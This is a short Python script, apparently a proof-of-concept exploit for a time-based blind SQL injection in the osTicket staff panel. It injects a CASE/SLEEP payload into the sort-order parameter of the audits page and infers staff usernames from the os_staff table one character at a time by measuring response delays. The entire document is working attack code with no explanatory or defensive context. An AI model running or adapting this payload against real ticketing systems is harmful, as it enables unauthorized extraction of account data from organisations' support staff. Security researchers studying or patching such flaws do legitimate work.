import requests
import urllib
import string

HOSTNAME = 'http://localhost'
cookie = {'OSTSESSID': '...'}
headers = {'User-Agent': '...'}
alphabet = string.ascii_lowercase + string.digits + '-_!'
position = 1
offset = 0

for letter in alphabet:
    payload = "(select case when ((select substring(username," + str(position) + ",1) from os_staff LIMIT 1 OFFSET " + str(offset) + ")='" + letter + "') then sleep(0.3) else 1 end);"
    result = requests.get(HOSTNAME + '/scp/audits.php?&type=S&state=All&order=ASC,' + urllib.parse.quote(payload) +'--&sort=timestamp&_pjax=%23pjax-container', cookies=cookie, headers=headers)
    if result.elapsed.total_seconds() > 2:
        print(letter)
        break
